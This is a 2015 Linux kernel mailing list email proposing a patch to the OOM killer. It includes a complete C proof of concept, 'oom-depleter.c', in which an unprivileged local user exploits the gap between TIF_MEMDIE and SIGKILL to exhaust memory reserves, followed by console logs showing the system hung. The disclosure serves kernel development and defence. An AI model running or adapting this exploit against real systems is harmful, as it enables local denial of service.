Return-Path: <owner-linux-mm@kvack.org>
Received: from mail-pa0-f44.google.com (mail-pa0-f44.google.com [209.85.220.44])
	by kanga.kvack.org (Postfix) with ESMTP id A776F6B0253
	for <linux-mm@kvack.org>; Fri, 31 Jul 2015 07:00:33 -0400 (EDT)
Received: by pachj5 with SMTP id hj5so39307685pac.3
        for <linux-mm@kvack.org>; Fri, 31 Jul 2015 04:00:33 -0700 (PDT)
Received: from www262.sakura.ne.jp (www262.sakura.ne.jp. [2001:e42:101:1:202:181:97:72])
        by mx.google.com with ESMTPS id ew8si9653980pac.28.2015.07.31.04.00.30
        for <linux-mm@kvack.org>
        (version=TLSv1 cipher=RC4-SHA bits=128/128);
        Fri, 31 Jul 2015 04:00:31 -0700 (PDT)
Received: from fsav401.sakura.ne.jp (fsav401.sakura.ne.jp [133.242.250.100])
	by www262.sakura.ne.jp (8.14.5/8.14.5) with ESMTP id t6VB0SPs003639
	for <linux-mm@kvack.org>; Fri, 31 Jul 2015 20:00:28 +0900 (JST)
	(envelope-from penguin-kernel@I-love.SAKURA.ne.jp)
Received: from AQUA (softbank126074231104.bbtec.net [126.74.231.104])
	(authenticated bits=0)
	by www262.sakura.ne.jp (8.14.5/8.14.5) with ESMTP id t6VB0S4P003636
	for <linux-mm@kvack.org>; Fri, 31 Jul 2015 20:00:28 +0900 (JST)
	(envelope-from penguin-kernel@I-love.SAKURA.ne.jp)
Subject: [PATCH 2/2] mm,oom: Reverse the order of setting TIF_MEMDIE and sending SIGKILL.
From: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>
Message-Id: <201507312000.IGH09394.OOFJSFOHMtQVLF@I-love.SAKURA.ne.jp>
Date: Fri, 31 Jul 2015 20:00:28 +0900
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Sender: owner-linux-mm@kvack.org
List-ID: <linux-mm.kvack.org>
To: linux-mm@kvack.org

Quoting from http://www.spinics.net/lists/linux-mm/msg89366.html
> On Mon 01-06-15 22:04:28, Tetsuo Handa wrote:
> > Michal Hocko wrote:
> > > > Likewise, move do_send_sig_info(SIGKILL, victim) to before
> > > > mark_oom_victim(victim) in case for_each_process() took very long time,
> > > > for the OOM victim can abuse ALLOC_NO_WATERMARKS by TIF_MEMDIE via e.g.
> > > > memset() in user space until SIGKILL is delivered.
> > > 
> > > This is unrelated and I believe even not necessary.
> > 
> > Why unnecessary? If serial console is configured and printing a series of
> > "Kill process %d (%s) sharing same memory" took a few seconds, the OOM
> > victim can consume all memory via malloc() + memset(), can't it?
> 
> Can? You are generating one corner case after another. All of them
> without actually showing it can happen in the real life. There are
> million+1 corner cases possible yet we would prefer to handle those that
> have changes to happen in the real life. So let's focus on the real life
> scenarios.
> 
> > What to do if the OOM victim cannot die immediately after consuming
> > all memory? I think that sending SIGKILL before setting TIF_MEMDIE
> > helps reducing consumption of memory reserves.
> 
> I think that SIGKILL before or after mark_oom_victim has close to zero
> effect. If you think that we should send SIGKILL before looking for
> tasks sharing mm then why not - BUT AGAIN A SEPARATE PATCH WITH A
> JUSTIFICATION please.

I tried to reproducing what I worried at
http://www.spinics.net/lists/linux-mm/msg82342.html . I confirmed that a
local unprivileged user can consume all memory reserves using the time lag.

---------- oom-depleter.c start ----------
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>

static int null_fd = EOF;
static char *buf = NULL;
static unsigned long size = 0;

static int dummy(void *unused)
{
	pause();
	return 0;
}

static int trigger(void *unused)
{
        read(null_fd, buf, size); /* Will cause OOM due to overcommit */
	return 0;
}

int main(int argc, char *argv[])
{
        int pipe_fd[2] = { EOF, EOF };
	unsigned long i;
	null_fd = open("/dev/zero", O_RDONLY);
	pipe(pipe_fd);
	for (size = 1048576; size < 512UL * (1 << 30); size <<= 1) {
                char *cp = realloc(buf, size);
                if (!cp) {
                        size >>= 1;
                        break;
                }
                buf = cp;
        }
	/*
	 * Create many child threads in order to enlarge time lag between
	 * the OOM killer sets TIF_MEMDIE to thread group leader and
	 * the OOM killer sends SIGKILL to that thread.
	 */
	for (i = 0; i < 1000; i++) {
		clone(dummy, malloc(1024) + 1024, CLONE_SIGHAND | CLONE_VM,
		      NULL);
		if (!i)
			close(pipe_fd[1]);
        }
	/* Let a child thread trigger the OOM killer. */
	clone(trigger, malloc(4096)+ 4096, CLONE_SIGHAND | CLONE_VM, NULL);
	/* Wait until the first child thread is killed by the OOM killer. */
	read(pipe_fd[0], &i, 1);
	/* Deplete all memory reserve using the time lag. */
	for (i = size; i; i -= 4096)
		buf[i - 1] = 1;
	return * (char *) NULL; /* Kill all threads. */
}
---------- oom-depleter.c end ----------

Checked memory reserve at 38.613801.
Launched oom-depleter around 40.
OOM-killer was invoked at 48.046321.
The thread group leader got TIF_MEMDIE at 50.064684.
The thread group leader depleted all memory reserves at 50.248677.
The thread group leader received SIGKILL at 52.299532.
Memory reserve not yet recovered as of 85.966108.
Memory reserve not yet recovered as of 185.044658.
Gave up waiting and restarted at 205.509157.

---------- console log start ----------
[   38.613801] sysrq: SysRq : Show Memory
[   38.616506] Mem-Info:
[   38.618106] active_anon:18185 inactive_anon:2085 isolated_anon:0
[   38.618106]  active_file:10615 inactive_file:18972 isolated_file:0
[   38.618106]  unevictable:0 dirty:7 writeback:0 unstable:0
[   38.618106]  slab_reclaimable:3015 slab_unreclaimable:4217
[   38.618106]  mapped:9940 shmem:2146 pagetables:1319 bounce:0
[   38.618106]  free:378300 free_pcp:486 free_cma:0
[   38.640475] Node 0 DMA free:9980kB min:400kB low:500kB high:600kB active_anon:2924kB inactive_anon:80kB active_file:816kB inactive_file:896kB unevictable:0kB isolated(anon):0kB isolated(file):0kB present:15988kB managed:15904kB mlocked:0kB dirty:0kB writeback:0kB mapped:596kB shmem:80kB slab_reclaimable:240kB slab_unreclaimable:308kB kernel_stack:80kB pagetables:64kB unstable:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB writeback_tmp:0kB pages_scanned:0 all_unreclaimable? no
[   38.655621] lowmem_reserve[]: 0 1731 1731 1731
[   38.657497] Node 0 DMA32 free:1503220kB min:44652kB low:55812kB high:66976kB active_anon:69816kB inactive_anon:8260kB active_file:41644kB inactive_file:74992kB unevictable:0kB isolated(anon):0kB isolated(file):0kB present:2080640kB managed:1774392kB mlocked:0kB dirty:28kB writeback:0kB mapped:39164kB shmem:8504kB slab_reclaimable:11820kB slab_unreclaimable:16560kB kernel_stack:3472kB pagetables:5212kB unstable:0kB bounce:0kB free_pcp:1944kB local_pcp:668kB free_cma:0kB writeback_tmp:0kB pages_scanned:0 all_unreclaimable? no
[   38.672950] lowmem_reserve[]: 0 0 0 0
[   38.673726] Node 0 DMA: 3*4kB (UM) 6*8kB (U) 4*16kB (UEM) 0*32kB 0*64kB 1*128kB (M) 2*256kB (EM) 2*512kB (UE) 2*1024kB (EM) 1*2048kB (E) 1*4096kB (M) = 9980kB
[   38.676854] Node 0 DMA32: 31*4kB (UEM) 27*8kB (UE) 32*16kB (UE) 13*32kB (UE) 14*64kB (UM) 7*128kB (UM) 8*256kB (UM) 8*512kB (UM) 3*1024kB (U) 4*2048kB (UM) 362*4096kB (UM) = 1503220kB
[   38.680159] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=2048kB
[   38.681517] 31733 total pagecache pages
[   38.682162] 0 pages in swap cache
[   38.682711] Swap cache stats: add 0, delete 0, find 0/0
[   38.683554] Free swap  = 0kB
[   38.684053] Total swap = 0kB
[   38.684528] 524157 pages RAM
[   38.685022] 0 pages HighMem/MovableOnly
[   38.685645] 76583 pages reserved
[   38.686173] 0 pages hwpoisoned
[   48.046321] oom-depleter invoked oom-killer: gfp_mask=0x280da, order=0, oom_score_adj=0
[   48.047754] oom-depleter cpuset=/ mems_allowed=0
[   48.048779] CPU: 1 PID: 4797 Comm: oom-depleter Not tainted 4.2.0-rc4-next-20150730+ #80
[   48.050612] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 07/31/2013
[   48.052434]  0000000000000000 000000004ecba3fc ffff88006c4938d0 ffffffff81614c2f
[   48.053816]  ffff88006c482580 ffff88006c493970 ffffffff81611671 0000000000001000
[   48.055218]  ffff88006c493918 ffffffff8109463c ffff8800784b2b40 ffff88007fc556f8
[   48.057428] Call Trace:
[   48.058775]  [<ffffffff81614c2f>] dump_stack+0x44/0x55
[   48.060647]  [<ffffffff81611671>] dump_header+0x84/0x21c
[   48.062591]  [<ffffffff8109463c>] ? update_curr+0x9c/0xe0
[   48.064393]  [<ffffffff810917f7>] ? __enqueue_entity+0x67/0x70
[   48.066506]  [<ffffffff81096b59>] ? set_next_entity+0x69/0x360
[   48.068633]  [<ffffffff81091ee0>] ? pick_next_entity+0xa0/0x150
[   48.070768]  [<ffffffff8110fad4>] oom_kill_process+0x364/0x3d0
[   48.072874]  [<ffffffff81281550>] ? security_capable_noaudit+0x40/0x60
[   48.074948]  [<ffffffff8110fd83>] out_of_memory+0x1f3/0x490
[   48.076820]  [<ffffffff81115214>] __alloc_pages_nodemask+0x904/0x930
[   48.078885]  [<ffffffff811569f0>] alloc_pages_vma+0xb0/0x1f0
[   48.080781]  [<ffffffff811385c0>] handle_mm_fault+0x13a0/0x1960
[   48.082936]  [<ffffffff8112ffce>] ? vmacache_find+0x1e/0xc0
[   48.084981]  [<ffffffff81055c9c>] __do_page_fault+0x17c/0x400
[   48.086791]  [<ffffffff81055f50>] do_page_fault+0x30/0x80
[   48.088636]  [<ffffffff81096b59>] ? set_next_entity+0x69/0x360
[   48.090630]  [<ffffffff8161c918>] page_fault+0x28/0x30
[   48.092359]  [<ffffffff813124c0>] ? __clear_user+0x20/0x50
[   48.094065]  [<ffffffff81316dd8>] iov_iter_zero+0x68/0x250
[   48.095939]  [<ffffffff813e9ef8>] read_iter_zero+0x38/0xa0
[   48.097690]  [<ffffffff8117ad04>] __vfs_read+0xc4/0xf0
[   48.099545]  [<ffffffff8117b489>] vfs_read+0x79/0x120
[   48.101129]  [<ffffffff8117c1a0>] SyS_read+0x50/0xc0
[   48.102648]  [<ffffffff8161adee>] entry_SYSCALL_64_fastpath+0x12/0x71
[   48.104388] Mem-Info:
[   48.105396] active_anon:410470 inactive_anon:2085 isolated_anon:0
[   48.105396]  active_file:0 inactive_file:31 isolated_file:0
[   48.105396]  unevictable:0 dirty:0 writeback:0 unstable:0
[   48.105396]  slab_reclaimable:1689 slab_unreclaimable:5719
[   48.105396]  mapped:390 shmem:2146 pagetables:2097 bounce:0
[   48.105396]  free:12966 free_pcp:63 free_cma:0
[   48.114279] Node 0 DMA free:7308kB min:400kB low:500kB high:600kB active_anon:6764kB inactive_anon:80kB active_file:0kB inactive_file:0kB unevictable:0kB isolated(anon):0kB isolated(file):0kB present:15988kB managed:15904kB mlocked:0kB dirty:0kB writeback:0kB mapped:8kB shmem:80kB slab_reclaimable:144kB slab_unreclaimable:372kB kernel_stack:240kB pagetables:568kB unstable:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB writeback_tmp:0kB pages_scanned:0 all_unreclaimable? yes
[   48.124147] lowmem_reserve[]: 0 1731 1731 1731
[   48.125753] Node 0 DMA32 free:44556kB min:44652kB low:55812kB high:66976kB active_anon:1635116kB inactive_anon:8260kB active_file:0kB inactive_file:124kB unevictable:0kB isolated(anon):0kB isolated(file):0kB present:2080640kB managed:1774392kB mlocked:0kB dirty:0kB writeback:0kB mapped:1552kB shmem:8504kB slab_reclaimable:6612kB slab_unreclaimable:22504kB kernel_stack:19344kB pagetables:7820kB unstable:0kB bounce:0kB free_pcp:252kB local_pcp:0kB free_cma:0kB writeback_tmp:0kB pages_scanned:1620 all_unreclaimable? yes
[   48.137007] lowmem_reserve[]: 0 0 0 0
[   48.138514] Node 0 DMA: 11*4kB (UE) 8*8kB (UEM) 6*16kB (UE) 2*32kB (EM) 0*64kB 1*128kB (U) 3*256kB (UEM) 2*512kB (UE) 3*1024kB (UEM) 1*2048kB (U) 0*4096kB = 7308kB
[   48.143010] Node 0 DMA32: 1049*4kB (UEM) 507*8kB (UE) 151*16kB (UE) 53*32kB (UEM) 83*64kB (UEM) 52*128kB (EM) 25*256kB (UEM) 11*512kB (M) 6*1024kB (UM) 1*2048kB (M) 0*4096kB = 44556kB
[   48.148196] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=2048kB
[   48.150810] 2156 total pagecache pages
[   48.152318] 0 pages in swap cache
[   48.154200] Swap cache stats: add 0, delete 0, find 0/0
[   48.156089] Free swap  = 0kB
[   48.157400] Total swap = 0kB
[   48.158694] 524157 pages RAM
[   48.160055] 0 pages HighMem/MovableOnly
[   48.161496] 76583 pages reserved
[   48.162989] 0 pages hwpoisoned
[   48.164453] [ pid ]   uid  tgid total_vm      rss nr_ptes nr_pmds swapents oom_score_adj name
(...snipped...)
[   50.061069] [ 4797]  1000  4797   541715   392157     776       6        0             0 oom-depleter
[   50.062841] Out of memory: Kill process 3796 (oom-depleter) score 877 or sacrifice child
[   50.064684] Killed process 3796 (oom-depleter) total-vm:2166860kB, anon-rss:1568628kB, file-rss:0kB
[   50.066454] Kill process 3797 (oom-depleter) sharing same memory
(...snipped...)
[   50.247563] Kill process 3939 (oom-depleter) sharing same memory
[   50.248677] oom-depleter: page allocation failure: order:0, mode:0x280da
[   50.248679] CPU: 2 PID: 3796 Comm: oom-depleter Not tainted 4.2.0-rc4-next-20150730+ #80
[   50.248680] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 07/31/2013
[   50.248682]  0000000000000000 000000001529812f ffff88007be67be0 ffffffff81614c2f
[   50.248683]  00000000000280da ffff88007be67c70 ffffffff81111914 0000000000000000
[   50.248684]  ffff88007fffdb28 0000000000000000 ffff88007fc99030 ffff88007be67d30
[   50.248684] Call Trace:
[   50.248689]  [<ffffffff81614c2f>] dump_stack+0x44/0x55
[   50.248692]  [<ffffffff81111914>] warn_alloc_failed+0xf4/0x150
[   50.248693]  [<ffffffff81114b76>] __alloc_pages_nodemask+0x266/0x930
[   50.248695]  [<ffffffff811569f0>] alloc_pages_vma+0xb0/0x1f0
[   50.248697]  [<ffffffff811385c0>] handle_mm_fault+0x13a0/0x1960
[   50.248702]  [<ffffffff8100d6dc>] ? __switch_to+0x23c/0x470
[   50.248704]  [<ffffffff81055c9c>] __do_page_fault+0x17c/0x400
[   50.248706]  [<ffffffff81055f50>] do_page_fault+0x30/0x80
[   50.248707]  [<ffffffff8161c918>] page_fault+0x28/0x30
[   50.248708] Mem-Info:
[   50.248710] active_anon:423405 inactive_anon:2085 isolated_anon:0
[   50.248710]  active_file:7 inactive_file:10 isolated_file:0
[   50.248710]  unevictable:0 dirty:0 writeback:0 unstable:0
[   50.248710]  slab_reclaimable:1689 slab_unreclaimable:5719
[   50.248710]  mapped:393 shmem:2146 pagetables:2097 bounce:0
[   50.248710]  free:0 free_pcp:21 free_cma:0
[   50.248714] Node 0 DMA free:28kB min:400kB low:500kB high:600kB active_anon:13988kB inactive_anon:80kB active_file:28kB inactive_file:0kB unevictable:0kB isolated(anon):0kB isolated(file):0kB present:15988kB managed:15904kB mlocked:0kB dirty:0kB writeback:0kB mapped:0kB shmem:80kB slab_reclaimable:144kB slab_unreclaimable:372kB kernel_stack:240kB pagetables:568kB unstable:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB writeback_tmp:0kB pages_scanned:4 all_unreclaimable? no
[   50.248715] lowmem_reserve[]: 0 1731 1731 1731
[   50.248717] Node 0 DMA32 free:0kB min:44652kB low:55812kB high:66976kB active_anon:1679632kB inactive_anon:8260kB active_file:0kB inactive_file:48kB unevictable:0kB isolated(anon):0kB isolated(file):0kB present:2080640kB managed:1774392kB mlocked:0kB dirty:0kB writeback:0kB mapped:1576kB shmem:8504kB slab_reclaimable:6612kB slab_unreclaimable:22504kB kernel_stack:19344kB pagetables:7820kB unstable:0kB bounce:0kB free_pcp:84kB local_pcp:0kB free_cma:0kB writeback_tmp:0kB pages_scanned:0 all_unreclaimable? no
[   50.248718] lowmem_reserve[]: 0 0 0 0
[   50.248721] Node 0 DMA: 0*4kB 0*8kB 0*16kB 0*32kB 0*64kB 0*128kB 0*256kB 0*512kB 0*1024kB 0*2048kB 0*4096kB = 0kB
[   50.248723] Node 0 DMA32: 0*4kB 0*8kB 0*16kB 0*32kB 0*64kB 0*128kB 0*256kB 0*512kB 0*1024kB 0*2048kB 0*4096kB = 0kB
[   50.248724] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=2048kB
[   50.248724] 2149 total pagecache pages
[   50.248725] 0 pages in swap cache
[   50.248725] Swap cache stats: add 0, delete 0, find 0/0
[   50.248725] Free swap  = 0kB
[   50.248726] Total swap = 0kB
[   50.248726] 524157 pages RAM
[   50.248726] 0 pages HighMem/MovableOnly
[   50.248726] 76583 pages reserved
[   50.248727] 0 pages hwpoisoned
(...snipped...)
[   50.248940] oom-depleter: page allocation failure: order:0, mode:0x280da
[   50.248940] CPU: 2 PID: 3796 Comm: oom-depleter Not tainted 4.2.0-rc4-next-20150730+ #80
[   50.248940] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 07/31/2013
[   50.248941]  0000000000000000 000000001529812f ffff88007be67be0 ffffffff81614c2f
[   50.248942]  00000000000280da ffff88007be67c70 ffffffff81111914 0000000000000000
[   50.248942]  ffff88007fffdb28 0000000000000000 ffff88007fc99030 ffff88007be67d30
[   50.248942] Call Trace:
[   50.248943]  [<ffffffff81614c2f>] dump_stack+0x44/0x55
[   50.248944]  [<ffffffff81111914>] warn_alloc_failed+0xf4/0x150
[   50.248945]  [<ffffffff81114b76>] __alloc_pages_nodemask+0x266/0x930
[   50.248946]  [<ffffffff811569f0>] alloc_pages_vma+0xb0/0x1f0
[   50.248947]  [<ffffffff811385c0>] handle_mm_fault+0x13a0/0x1960
[   50.248948]  [<ffffffff81110080>] ? pagefault_out_of_memory+0x60/0xb0
[   50.248949]  [<ffffffff81055c9c>] __do_page_fault+0x17c/0x400
[   50.248950]  [<ffffffff81055f50>] do_page_fault+0x30/0x80
[   50.248951]  [<ffffffff8161c918>] page_fault+0x28/0x30
[   50.248951] Mem-Info:
[   50.248952] active_anon:423405 inactive_anon:2085 isolated_anon:0
[   50.248952]  active_file:7 inactive_file:10 isolated_file:0
[   50.248952]  unevictable:0 dirty:0 writeback:0 unstable:0
[   50.248952]  slab_reclaimable:1689 slab_unreclaimable:5719
[   50.248952]  mapped:393 shmem:2146 pagetables:2097 bounce:0
[   50.248952]  free:0 free_pcp:21 free_cma:0
[   50.248954] Node 0 DMA free:28kB min:400kB low:500kB high:600kB active_anon:13988kB inactive_anon:80kB active_file:28kB inactive_file:0kB unevictable:0kB isolated(anon):0kB isolated(file):0kB present:15988kB managed:15904kB mlocked:0kB dirty:0kB writeback:0kB mapped:0kB shmem:80kB slab_reclaimable:144kB slab_unreclaimable:372kB kernel_stack:240kB pagetables:568kB unstable:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB writeback_tmp:0kB pages_scanned:4 all_unreclaimable? no
[   50.248955] lowmem_reserve[]: 0 1731 1731 1731
[   50.248957] Node 0 DMA32 free:0kB min:44652kB low:55812kB high:66976kB active_anon:1679632kB inactive_anon:8260kB active_file:0kB inactive_file:48kB unevictable:0kB isolated(anon):0kB isolated(file):0kB present:2080640kB managed:1774392kB mlocked:0kB dirty:0kB writeback:0kB mapped:1576kB shmem:8504kB slab_reclaimable:6612kB slab_unreclaimable:22504kB kernel_stack:19344kB pagetables:7820kB unstable:0kB bounce:0kB free_pcp:84kB local_pcp:0kB free_cma:0kB writeback_tmp:0kB pages_scanned:0 all_unreclaimable? no
[   50.248957] lowmem_reserve[]: 0 0 0 0
[   50.248959] Node 0 DMA: 0*4kB 0*8kB 0*16kB 0*32kB 0*64kB 0*128kB 0*256kB 0*512kB 0*1024kB 0*2048kB 0*4096kB = 0kB
[   50.248961] Node 0 DMA32: 0*4kB 0*8kB 0*16kB 0*32kB 0*64kB 0*128kB 0*256kB 0*512kB 0*1024kB 0*2048kB 0*4096kB = 0kB
[   50.248961] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=2048kB
[   50.248962] 2149 total pagecache pages
[   50.248962] 0 pages in swap cache
[   50.248962] Swap cache stats: add 0, delete 0, find 0/0
[   50.248962] Free swap  = 0kB
[   50.248962] Total swap = 0kB
[   50.248963] 524157 pages RAM
[   50.248963] 0 pages HighMem/MovableOnly
[   50.248963] 76583 pages reserved
[   50.248963] 0 pages hwpoisoned
[   51.212857] Kill process 3940 (oom-depleter) sharing same memory
(...snipped...)
[   52.299532] Kill process 4797 (oom-depleter) sharing same memory
[   85.966108] sysrq: SysRq : Show Memory
[   85.967079] Mem-Info:
[   85.967643] active_anon:423788 inactive_anon:2085 isolated_anon:0
[   85.967643]  active_file:0 inactive_file:1 isolated_file:0
[   85.967643]  unevictable:0 dirty:0 writeback:0 unstable:0
[   85.967643]  slab_reclaimable:1689 slab_unreclaimable:5401
[   85.967643]  mapped:391 shmem:2146 pagetables:2123 bounce:0
[   85.967643]  free:4 free_pcp:0 free_cma:0
[   85.974400] Node 0 DMA free:0kB min:400kB low:500kB high:600kB active_anon:14076kB inactive_anon:80kB active_file:0kB inactive_file:0kB unevictable:0kB isolated(anon):0kB isolated(file):0kB present:15988kB managed:15904kB mlocked:0kB dirty:0kB writeback:0kB mapped:8kB shmem:80kB slab_reclaimable:144kB slab_unreclaimable:340kB kernel_stack:240kB pagetables:572kB unstable:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB writeback_tmp:0kB pages_scanned:8 all_unreclaimable? yes
[   85.983232] lowmem_reserve[]: 0 1731 1731 1731
[   85.984550] Node 0 DMA32 free:16kB min:44652kB low:55812kB high:66976kB active_anon:1681076kB inactive_anon:8260kB active_file:0kB inactive_file:4kB unevictable:0kB isolated(anon):0kB isolated(file):0kB present:2080640kB managed:1774392kB mlocked:0kB dirty:0kB writeback:0kB mapped:1556kB shmem:8504kB slab_reclaimable:6612kB slab_unreclaimable:21264kB kernel_stack:19328kB pagetables:7920kB unstable:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB writeback_tmp:0kB pages_scanned:0 all_unreclaimable? no
[   85.994326] lowmem_reserve[]: 0 0 0 0
[   85.995638] Node 0 DMA: 0*4kB 0*8kB 0*16kB 0*32kB 0*64kB 0*128kB 0*256kB 0*512kB 0*1024kB 0*2048kB 0*4096kB = 0kB
[   85.998389] Node 0 DMA32: 3*4kB (UM) 1*8kB (U) 1*16kB (U) 0*32kB 0*64kB 0*128kB 0*256kB 0*512kB 0*1024kB 0*2048kB 0*4096kB = 36kB
[   86.001506] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=2048kB
[   86.003604] 2147 total pagecache pages
[   86.004878] 0 pages in swap cache
[   86.006083] Swap cache stats: add 0, delete 0, find 0/0
[   86.007638] Free swap  = 0kB
[   86.008793] Total swap = 0kB
[   86.009941] 524157 pages RAM
[   86.011089] 0 pages HighMem/MovableOnly
[   86.012413] 76583 pages reserved
[   86.013632] 0 pages hwpoisoned
[  125.269135] sysrq: SysRq : Show State
[  125.270536]   task                        PC stack   pid father
[  125.272269] systemd         S ffff88007cc07a08     0     1      0 0x00000000
[  125.274343]  ffff88007cc07a08 ffff88007cc08000 ffff88007cc08000 ffff88007cc07a40
[  125.276505]  ffff88007fc0db00 00000000fffd55be ffff88007fffc000 ffff88007cc07a20
[  125.278661]  ffffffff8161793e ffff88007fc0db00 ffff88007cc07aa8 ffffffff81619fcd
[  125.280844] Call Trace:
[  125.282076]  [<ffffffff8161793e>] schedule+0x2e/0x70
[  125.283698]  [<ffffffff81619fcd>] schedule_timeout+0x11d/0x1c0
[  125.285481]  [<ffffffff810be7c0>] ? cascade+0x90/0x90
[  125.287131]  [<ffffffff8111caef>] ? pfmemalloc_watermark_ok+0xaf/0xe0
[  125.289038]  [<ffffffff8111ccee>] throttle_direct_reclaim+0x1ce/0x240
[  125.290955]  [<ffffffff810a0870>] ? wait_woken+0x80/0x80
[  125.292676]  [<ffffffff81120bd0>] try_to_free_pages+0x80/0xc0
[  125.294478]  [<ffffffff81114e14>] __alloc_pages_nodemask+0x504/0x930
[  125.296401]  [<ffffffff8110cb07>] ? __page_cache_alloc+0x97/0xb0
[  125.298283]  [<ffffffff8115576c>] alloc_pages_current+0x8c/0x100
[  125.300141]  [<ffffffff8110cb07>] __page_cache_alloc+0x97/0xb0
[  125.301977]  [<ffffffff8110e728>] filemap_fault+0x218/0x490
[  125.303759]  [<ffffffff81237c79>] xfs_filemap_fault+0x39/0x60
[  125.305576]  [<ffffffff81132e69>] __do_fault+0x49/0xf0
[  125.307273]  [<ffffffff8113809f>] handle_mm_fault+0xe7f/0x1960
[  125.309100]  [<ffffffff811bac6e>] ? ep_scan_ready_list.isra.12+0x19e/0x1c0
[  125.311114]  [<ffffffff811badce>] ? ep_poll+0x11e/0x320
[  125.312841]  [<ffffffff81055c9c>] __do_page_fault+0x17c/0x400
[  125.314643]  [<ffffffff81055f50>] do_page_fault+0x30/0x80
[  125.316363]  [<ffffffff8161c918>] page_fault+0x28/0x30
(...snipped...)
[  130.699717] oom-depleter    x ffff88007c06bc28     0  3797      1 0x00000086
[  130.701724]  ffff88007c06bc28 ffff88007a623e80 ffff88007c06c000 ffff88007a6241d0
[  130.703703]  ffff88007c6373e8 ffff88007a623e80 ffff88007cc08000 ffff88007c06bc40
[  130.705678]  ffffffff8161793e ffff88007a624450 ffff88007c06bcb0 ffffffff8106b0d7
[  130.707654] Call Trace:
[  130.708632]  [<ffffffff8161793e>] schedule+0x2e/0x70
[  130.710064]  [<ffffffff8106b0d7>] do_exit+0x677/0xae0
[  130.711535]  [<ffffffff8106b5ba>] do_group_exit+0x3a/0xb0
[  130.713037]  [<ffffffff81074d4f>] get_signal+0x17f/0x540
[  130.714537]  [<ffffffff8100e302>] do_signal+0x32/0x650
[  130.715991]  [<ffffffff81099ffc>] ? load_balance+0x1bc/0x8b0
[  130.717545]  [<ffffffff8100362d>] prepare_exit_to_usermode+0x9d/0xf0
[  130.719275]  [<ffffffff81003753>] syscall_return_slowpath+0xd3/0x1d0
[  130.720973]  [<ffffffff816173a4>] ? __schedule+0x274/0x7e0
[  130.722536]  [<ffffffff8161793e>] ? schedule+0x2e/0x70
[  130.723989]  [<ffffffff8161af4c>] int_ret_from_sys_call+0x25/0x8f
(...snipped...)
[  157.243284] oom-depleter    R  running task        0  4797      1 0x00000084
[  157.245131]  ffff88006c482580 000000004ecba3fc ffff88007fc83c38 ffffffff8108d14a
[  157.247105]  ffff88006c482580 ffff88006c4827c0 ffff88007fc83c78 ffffffff8108d23d
[  157.249092]  ffff88006c482970 000000004ecba3fc ffffffff8188b780 0000000000000074
[  157.251054] Call Trace:
[  157.252018]  <IRQ>  [<ffffffff8108d14a>] sched_show_task+0xaa/0x110
[  157.253740]  [<ffffffff8108d23d>] show_state_filter+0x8d/0xc0
[  157.255258]  [<ffffffff813cd31b>] sysrq_handle_showstate+0xb/0x20
[  157.256898]  [<ffffffff813cda24>] __handle_sysrq+0xf4/0x150
[  157.258442]  [<ffffffff813cde10>] sysrq_filter+0x360/0x3a0
[  157.259974]  [<ffffffff81497c12>] input_to_handler+0x52/0x100
[  157.261552]  [<ffffffff81499797>] input_pass_values.part.5+0x167/0x180
[  157.263270]  [<ffffffff81499afb>] input_handle_event+0xfb/0x4f0
[  157.264875]  [<ffffffff81499f3e>] input_event+0x4e/0x70
[  157.266366]  [<ffffffff814a18eb>] atkbd_interrupt+0x5bb/0x6a0
[  157.267929]  [<ffffffff81495101>] serio_interrupt+0x41/0x80
[  157.269457]  [<ffffffff81495d7a>] i8042_interrupt+0x1da/0x3a0
[  157.271017]  [<ffffffff810b0d3b>] handle_irq_event_percpu+0x2b/0x100
[  157.272678]  [<ffffffff810b0e4a>] handle_irq_event+0x3a/0x60
[  157.274224]  [<ffffffff810b3cb6>] handle_edge_irq+0xa6/0x140
[  157.275759]  [<ffffffff81010ad9>] handle_irq+0x19/0x30
[  157.277187]  [<ffffffff81010478>] do_IRQ+0x48/0xd0
[  157.278563]  [<ffffffff8161b8c7>] common_interrupt+0x87/0x87
[  157.280091]  <EOI>  [<ffffffff810a2eb9>] ? native_queued_spin_lock_slowpath+0x19/0x180
[  157.282070]  [<ffffffff8161a95c>] _raw_spin_lock+0x1c/0x20
[  157.283597]  [<ffffffff81130bcd>] __list_lru_count_one.isra.4+0x1d/0x50
[  157.285316]  [<ffffffff81130c1e>] list_lru_count_one+0x1e/0x20
[  157.286898]  [<ffffffff8117d610>] super_cache_count+0x50/0xd0
[  157.288477]  [<ffffffff8111d1d4>] shrink_slab.part.41+0xf4/0x280
[  157.290087]  [<ffffffff81120510>] shrink_zone+0x2c0/0x2d0
[  157.291595]  [<ffffffff81120894>] do_try_to_free_pages+0x164/0x420
[  157.293242]  [<ffffffff81120be4>] try_to_free_pages+0x94/0xc0
[  157.294799]  [<ffffffff81114e14>] __alloc_pages_nodemask+0x504/0x930
[  157.296474]  [<ffffffff811569f0>] alloc_pages_vma+0xb0/0x1f0
[  157.298019]  [<ffffffff811385c0>] handle_mm_fault+0x13a0/0x1960
[  157.299606]  [<ffffffff8112ffce>] ? vmacache_find+0x1e/0xc0
[  157.301131]  [<ffffffff81055c9c>] __do_page_fault+0x17c/0x400
[  157.302676]  [<ffffffff81055f50>] do_page_fault+0x30/0x80
